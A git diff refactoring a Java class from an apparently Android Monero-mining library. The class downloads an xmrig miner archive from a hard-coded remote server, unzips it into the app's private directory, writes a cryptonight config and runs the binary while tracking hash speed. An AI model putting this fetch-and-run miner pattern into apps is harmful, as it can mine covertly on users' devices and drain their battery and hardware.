@@ -13,7 +13,6 @@ import java.io.InputStreamReader;
 import java.io.ObjectStreamException;
 
 import waterhole.miner.core.utils.FileUtils;
-import waterhole.miner.core.utils.LogUtils;
 
 import static waterhole.miner.core.asyn.AsyncTaskAssistant.executeOnThreadPool;
 import static waterhole.miner.core.utils.FileUtils.downloadFile;
@@ -28,13 +27,46 @@ final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallbac
     // todo kzw 目前使用测试接口
     private static final String OLD_MINER_DOWNLOAD_URL = "http://eidon.top:8000/05171156/xmr-miner-old.zip";
 
+    private Context mContext;
     private Process mProcess;
-    private String mPrivatePath;
     private OutputReaderThread mOutputHandler;
     private int mAccepted;
     private String mSpeed = "./.";
 
-    private Context mContext;
+    @TargetApi(19)
+    private final class OutputReaderThread extends Thread {
+
+        private InputStream inputStream;
+        private StringBuilder output = new StringBuilder();
+        private BufferedReader reader;
+
+        OutputReaderThread(InputStream inputStream) {
+            this.inputStream = inputStream;
+        }
+
+        public void run() {
+            try {
+                reader = new BufferedReader(new InputStreamReader(inputStream));
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    output.append(line + System.lineSeparator());
+                    if (line.contains("accepted")) {
+                        mAccepted++;
+                    } else if (line.contains("speed")) {
+                        String[] split = TextUtils.split(line, " ");
+                        mSpeed = split[split.length - 2];
+                    }
+                    info(LOG_TAG, "accepted = " + mAccepted + " ,speed = " + mSpeed);
+                }
+            } catch (IOException e) {
+                error(LOG_TAG, "exception", e);
+            }
+        }
+
+        public StringBuilder getOutput() {
+            return output;
+        }
+    }
 
     private OldXmr() {
     }
@@ -74,11 +106,10 @@ final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallbac
         if (mProcess != null) {
             mProcess.destroy();
             mProcess = null;
-            LogUtils.info(LOG_TAG, "stopped");
         }
     }
 
-    private void writeOldConfig(String privatePath) {
+    private void writeConfig(String privatePath) {
         // todo kzw 目前参数写死
         String config = "{\n" +
                 "         \"algo\": \"cryptonight\",\n" +
@@ -119,55 +150,21 @@ final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallbac
         }
     }
 
-    /**
-     * thread to collect the binary's output
-     */
-    @TargetApi(19)
-    private final class OutputReaderThread extends Thread {
-
-        private InputStream inputStream;
-        private StringBuilder output = new StringBuilder();
-        private BufferedReader reader;
-
-        OutputReaderThread(InputStream inputStream) {
-            this.inputStream = inputStream;
-        }
-
-        public void run() {
-            try {
-                reader = new BufferedReader(new InputStreamReader(inputStream));
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    output.append(line + System.lineSeparator());
-                    if (line.contains("accepted")) {
-                        mAccepted++;
-                    } else if (line.contains("speed")) {
-                        String[] split = TextUtils.split(line, " ");
-                        mSpeed = split[split.length - 2];
-                    }
-                    info(LOG_TAG, "accepted = " + mAccepted + " ,speed = " + mSpeed);
-                }
-            } catch (IOException e) {
-                error(LOG_TAG, "exception", e);
-            }
-        }
-
-        public StringBuilder getOutput() {
-            return output;
-        }
-    }
-
     @Override
     public void onDownloadSuccess(String pathName) {
         info(LOG_TAG, "download old miner success");
+
         // 旧版门罗挖矿文件
         String fileDir = mContext.getFilesDir().getAbsolutePath();
         File xmrig = new File(fileDir + "/xmrig");
-        LogUtils.info(LOG_TAG, "xmrig exist: " + xmrig.exists());
+        info(LOG_TAG, "xmrig exist: " + xmrig.exists());
+
         File uvFile = new File(fileDir + "/libuv.so");
-        LogUtils.info(LOG_TAG, "libuv.so exist: " + uvFile.exists());
+        info(LOG_TAG, "libuv.so exist: " + uvFile.exists());
+
         File cplusFile = new File(fileDir + "/libc++_shared.so");
-        LogUtils.info(LOG_TAG, "libc++_shared.so exist: " + cplusFile.exists());
+        info(LOG_TAG, "libc++_shared.so exist: " + cplusFile.exists());
+
         if (!xmrig.exists() || !uvFile.exists() || !cplusFile.exists()) {
             unzip(pathName, fileDir, this);
         } else {
@@ -188,9 +185,9 @@ final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallbac
             mProcess.destroy();
         }
         // path where we may execute our program
-        mPrivatePath = mContext.getFilesDir().getAbsolutePath();
+        String privatePath = mContext.getFilesDir().getAbsolutePath();
         // write the config
-        writeOldConfig(mPrivatePath);
+        writeConfig(privatePath);
         try {
             // run xmrig using the config
             String[] args = {"./xmrig"};
@@ -198,7 +195,7 @@ final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallbac
             // in our directory
             pb.directory(mContext.getFilesDir());
             // with the directory as ld path so xmrig finds the libs
-            pb.environment().put("LD_LIBRARY_PATH", mPrivatePath);
+            pb.environment().put("LD_LIBRARY_PATH", privatePath);
             // in case of errors, read them
             pb.redirectErrorStream();
 
@@ -209,7 +206,7 @@ final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallbac
             mOutputHandler = new OutputReaderThread(mProcess.getInputStream());
             mOutputHandler.start();
         } catch (Exception e) {
-            LogUtils.error(LOG_TAG, "exception:", e);
+            error(LOG_TAG, "exception:", e);
             mProcess = null;
         }
     }
